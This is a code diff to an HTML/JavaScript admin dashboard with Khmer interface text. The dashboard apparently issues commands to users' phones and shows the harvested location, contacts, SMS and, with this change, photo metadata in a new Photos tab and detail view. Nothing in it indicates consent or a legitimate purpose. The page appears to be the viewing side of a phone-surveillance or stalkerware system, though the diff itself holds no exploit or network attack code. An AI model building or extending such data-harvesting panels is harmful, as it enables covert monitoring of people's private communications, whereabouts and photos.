@@ -448,6 +448,7 @@
 
   <div class="tabs">
     <button class="tab-btn active" data-tab="location">📍 ទីតាំង</button>
+    <button class="tab-btn" data-tab="photos">🖼️ Photos</button>
     <button class="tab-btn" data-tab="contacts">👥 Contacts</button>
     <button class="tab-btn" data-tab="sms">💬 SMS</button>
   </div>
@@ -470,6 +471,11 @@
     </div>
     <div class="stats" id="locationStats"></div>
     <div id="locationContent"></div>
+  </div>
+
+  <div id="photos-tab" class="tab-content">
+    <div class="stats" id="photosStats"></div>
+    <div id="photosContent"></div>
   </div>
 
   <div id="contacts-tab" class="tab-content">
@@ -554,11 +560,13 @@ async function loadData() {
     const commands = await api(`/device/commands?user_id=${userId}&limit=200`);
     
     const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
+    const photosCmd = commands.find(c => c.command_type === 'get_photos' && c.result_data);
     const contactsCmd = commands.find(c => c.command_type === 'get_contacts' && c.result_data);
     const smsCmd = commands.find(c => c.command_type === 'get_sms' && c.result_data);
     
     commandData = {
       location: locationCmd?.result_data,
+      photos: photosCmd?.result_data,
       contacts: contactsCmd?.result_data,
       sms: smsCmd?.result_data,
     };
@@ -566,6 +574,7 @@ async function loadData() {
     document.getElementById('pageMeta').textContent = `User ID: ${userId}`;
     
     renderLocation();
+    renderPhotos();
     renderContacts();
     renderSMS();
     
@@ -684,6 +693,96 @@ function renderLocation() {
       </div>
     </div>
   `;
+}
+
+function renderPhotos() {
+  const data = commandData.photos;
+  if (!data || !data.photos) {
+    document.getElementById('photosStats').innerHTML = '';
+    document.getElementById('photosContent').innerHTML = `
+      <div class="empty">
+        <div class="empty-icon">🖼️</div>
+        <div class="empty-text">មិនមានរូបភាពទេ<br>សូមចុច 🖼️ Photos ក្នុង admin panel ដើម្បីទាញយក</div>
+      </div>
+    `;
+    return;
+  }
+  
+  const photos = data.photos;
+  
+  document.getElementById('photosStats').innerHTML = `
+    <div class="stat-card">
+      <div class="stat-value">${photos.length}</div>
+      <div class="stat-label">🖼️ រូបភាពទាំងអស់</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value">${(photos.reduce((sum, p) => sum + (p.size || 0), 0) / 1024 / 1024).toFixed(2)} MB</div>
+      <div class="stat-label">💾 ទំហំសរុប</div>
+    </div>
+  `;
+  
+  document.getElementById('photosContent').innerHTML = `
+    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; margin-top: 20px;">
+      ${photos.map(p => `
+        <div style="background: white; border: 2px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: all 0.3s; cursor: pointer;" 
+             onmouseover="this.style.borderColor='#667eea'; this.style.transform='translateY(-4px)';"
+             onmouseout="this.style.borderColor='#e0e0e0'; this.style.transform='translateY(0)';"
+             onclick="viewPhotoDetail(${p.id})">
+          <div style="width: 100%; height: 200px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; color: white; font-size: 48px;">
+            🖼️
+          </div>
+          <div style="padding: 12px;">
+            <div style="font-weight: 600; font-size: 13px; color: #333; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+              ${esc(p.name || 'Unknown')}
+            </div>
+            <div style="font-size: 11px; color: #666; margin-top: 4px;">
+              ${dt(p.date)} • ${(p.size / 1024).toFixed(1)} KB
+            </div>
+            <div style="font-size: 11px; color: #999; margin-top: 2px;">
+              ${p.width}x${p.height}
+            </div>
+          </div>
+        </div>
+      `).join('')}
+    </div>
+  `;
+}
+
+function viewPhotoDetail(photoId) {
+  const photo = commandData.photos.photos.find(p => p.id === photoId);
+  if (!photo) return;
+  
+  const html = `
+    <div style="text-align: center;">
+      <div style="width: 100%; height: 400px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; color: white; font-size: 96px; border-radius: 12px; margin-bottom: 20px;">
+        🖼️
+      </div>
+      <h3 style="color: #333; margin-bottom: 12px;">${esc(photo.name)}</h3>
+      <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; text-align: left; margin-top: 20px;">
+        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
+          <small style="color: #666;">កាលបរិច្ឆេទ</small><br>
+          <strong>${dt(photo.date)}</strong>
+        </div>
+        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
+          <small style="color: #666;">ទំហំ</small><br>
+          <strong>${(photo.size / 1024).toFixed(2)} KB</strong>
+        </div>
+        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
+          <small style="color: #666;">ទំហំរូបភាព</small><br>
+          <strong>${photo.width} x ${photo.height}</strong>
+        </div>
+        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
+          <small style="color: #666;">ប្រភេទ</small><br>
+          <strong>${esc(photo.mimeType)}</strong>
+        </div>
+      </div>
+      <div style="margin-top: 20px; padding: 12px; background: #fff3cd; border-left: 4px solid #ffc107; border-radius: 8px; text-align: left;">
+        <strong>ℹ️ ចំណាំ:</strong> នេះជា metadata នៃរូបភាព។ ដើម្បីមើលរូបភាពពិត សូមចូលទៅក្នុងទូរស័ព្ទដោយផ្ទាល់។
+      </div>
+    </div>
+  `;
+  
+  showModal('🖼️ ព័ត៌មានរូបភាព', html);
 }
 
 function toggleMapView() {
